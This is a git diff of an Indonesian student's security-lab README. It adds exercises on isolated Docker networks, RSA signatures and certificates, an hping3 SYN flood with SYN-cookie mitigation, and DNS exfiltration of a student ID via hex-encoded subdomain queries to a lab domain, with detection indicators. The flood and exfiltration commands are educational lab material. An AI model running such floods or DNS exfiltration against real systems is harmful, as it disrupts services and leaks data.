@@ -67,7 +67,7 @@ Mengamankan file teks menggunakan algoritma enkripsi simetris AES-256-CBC, serta
   ```
 Hasil Praktikum :
 <img width="2880" height="538" alt="A4" src="https://github.com/user-attachments/assets/027cc0df-52c3-43fd-8abf-530422bf3aa5" />
-Penjelasan "
+Penjelasan :
   - Enkripsi dilakukan menggunakan AES-256-CBC dengan proteksi PBKDF2 dan kunci sandi kunci123.
   - Dekripsi dengan password benar berhasil memulihkan teks asli, sedangkan password salah memunculkan error bad decrypt. Parameter -a digunakan         untuk format keluaran Base64.
 
@@ -86,3 +86,88 @@ Hasil Praktikum :
 Penjelasan :
   - Jaringan kustom lab-net memungkinkan resolusi nama host antar-kontainer secara otomatis.
   - Uji coba ping dan wget membuktikan konektivitas jaringan lapisan 3 serta akses HTTP internal antar-kontainer berjalan dengan sukses.
+
+
+## BAGIAN A
+
+## B1. Docker Compose Multi-Container Terisolasi
+Membuat dan menjalankan arsitektur multi-container menggunakan Docker Compose pada jaringan internal terisolasi (`internal: true`) tanpa membuka *port* publik ke host.
+  ```
+  cd b/b1-compose
+  docker compose up -d
+  docker compose exec attacker wget -qO- http://target
+  docker compose down -v
+  ```
+Hasil Praktikum :
+<img width="2880" height="1800" alt="B1" src="https://github.com/user-attachments/assets/7d0fff41-d04a-4bae-bd4c-0b6c50f64f4e" />
+Penjelasan :
+  - Perintah dijalankan:
+Layanan target (Nginx) dan attacker (Alpine) dijalankan di dalam jaringan virtual lab dengan parameter internal: true.Kontainer attacker berhasil mengakses halaman web target secara internal menggunakan utilitas wget.
+  - Mengapa curl http://localhost dari host tidak bisa mencapai target?
+Karena jaringan Docker dikonfigurasi dengan opsi internal: true yang memutus akses internet dan komunikasi eksternal dari luar jaringan virtual tersebut. Selain itu, service target tidak memiliki pemetaan port (ports) ke mesin host, sehingga komputer host tidak memiliki jalur masuk (route) atau port binding untuk meneruskan permintaan HTTP dari luar kontainer.
+
+## B2. Kriptografi RSA dan Sertifikat
+Melakukan pembangkitan kunci asimetris RSA, penandatanganan digital (digital signature), verifikasi integritas pesan, serta pembuatan dan pemeriksaan sertifikat X.509 (self-signed).
+  ```
+  docker run --rm -it -v "$PWD":/work uts-openssl sh
+
+  # Di dalam kontainer:
+  openssl genrsa -out priv.pem 2048
+  openssl rsa -in priv.pem -pubout -out pub.pem
+  echo 'pesan untuk ditandatangani' > pesan.txt
+  openssl dgst -sha256 -sign priv.pem -out sig.bin pesan.txt
+  openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
+  echo 'diubah' >> pesan.txt
+  openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
+  openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 -subj /CN=lab.uts.local
+  openssl x509 -in cert.pem -noout -subject -issuer -dates
+  ```
+Hasil Praktikum :
+<img width="2880" height="1800" alt="B2" src="https://github.com/user-attachments/assets/aa009331-9ef0-4af7-ab06-a4e745871527" />
+Penjelasan :
+  - Hasil Eksekusi:
+Proses verifikasi pertama menghasilkan Verified OK saat file asli divalidasi dengan kunci publik. Setelah isi file diubah, verifikasi menghasilkan Verification Failure, yang membuktikan bahwa tanda tangan digital melindungi integritas data dari manipulasi.
+  - Perbedaan Sertifikat Self-Signed dan CA:
+Sertifikat self-signed ditandatangani oleh pembuatnya sendiri tanpa divalidasi oleh otoritas terpercaya, sehingga sering memicu peringatan keamanan pada sistem atau peramban web. Sebaliknya, sertifikat yang ditandatangani oleh Certificate Authority (CA) tepercaya divalidasi oleh pihak ketiga yang independen, sehingga otomatis diakui keaslian dan kepercayaannya oleh sistem secara global.   
+
+## B3. SYN Flood dan Deteksinya
+Mensimulasikan serangan Denial of Service (DoS) berjenis SYN Flood menggunakan alat uji hping3 serta mengamati lonjakan antrean koneksi setengah terbuka (SYN_RECV) pada server target.
+  ```
+  cd b/b3-syn-flood
+  docker compose up -d
+  docker compose exec target netstat -ant | grep -c SYN_RECV
+  docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
+  docker compose exec target netstat -ant | grep -c SYN_RECV
+  docker compose exec target sysctl -w net.ipv4.tcp_syncookies=1
+  docker compose down -v
+  ```
+Hasil Praktikum
+<img width="2880" height="940" alt="B3" src="https://github.com/user-attachments/assets/e031c976-1bef-42a7-b933-a03668bf5081" />
+Penjelasan :
+  - Jumlah SYN_RECV sebelum serangan:
+Bernilai 0 (kondisi normal tanpa koneksi tertunda).
+  - Menjalankan serangan:
+Pengiriman paket SYN secara membabi-buta (flooding) dilakukan dari kontainer attacker ke port 80 target selama 15 detik.     - Jumlah SYN_RECV saat serangan: Melonjak naik (misalnya menjadi 1 atau lebih tinggi pada antrean terbatas lab) yang menunjukkan sumber daya           memori server mulai terbebani oleh handshake palsu.
+  - Mitigasi (SYN Cookies):
+Fitur SYN cookies mengizinkan server merespons permintaan SYN tanpa mengalokasikan memori backlog di awal; server baru       mengalokasikan sumber daya setelah menerima paket ACK yang sah, sehingga memblokir potensi kelumpuhan memori akibat SYN flood.   
+  
+  ## B4. DNS Exfiltration Lewat Subdomain
+  Menyelundupkan data rahasia (NIM mahasiswa) ke luar jaringan melalui label subdomain pada kueri protokol DNS standar.  
+  ```
+  cd b/b4-dns-exfil
+  docker compose up -d
+  echo -n '24552011306' | xxd -p
+  docker compose exec attacker dig +short 3234353532303131333036.exfil.lab @dns
+  docker compose logs dns | grep exfil.lab
+  echo '3234353532303131333036' | xxd -r -p
+  docker compose down -v
+  ```
+Hasil Praktikum 
+<img width="2860" height="994" alt="B4" src="https://github.com/user-attachments/assets/688076b7-64e0-4d64-b744-9abdebe0a1b5" />
+Penjelasan :
+  - Hasil Eksekusi:
+NIM 24552011306 dikonversi ke format heksadesimal (3234353532303131333036), disisipkan ke kueri DNS, berhasil terekam di log server DNS, dan didekode kembali menjadi teks asli dengan sukses.
+  - Mengapa teknik ini sulit diblokir firewall biasa?
+Karena protokol DNS (menggunakan port UDP 53) merupakan layanan fundamental yang mutlak diizinkan keluar-masuk jaringan korporat atau publik untuk aktivitas internet sehari-hari, sehingga firewall konvensional jarang mencurigai kueri DNS yang membawa muatan tersembunyi.
+  - Indikator Deteksi:
+Adanya lonjakan frekuensi permintaan kueri DNS berulang dengan panjang label subdomain yang tidak normal, acak, atau memiliki tingkat entropi tinggi menuju domain eksternal yang sama. 
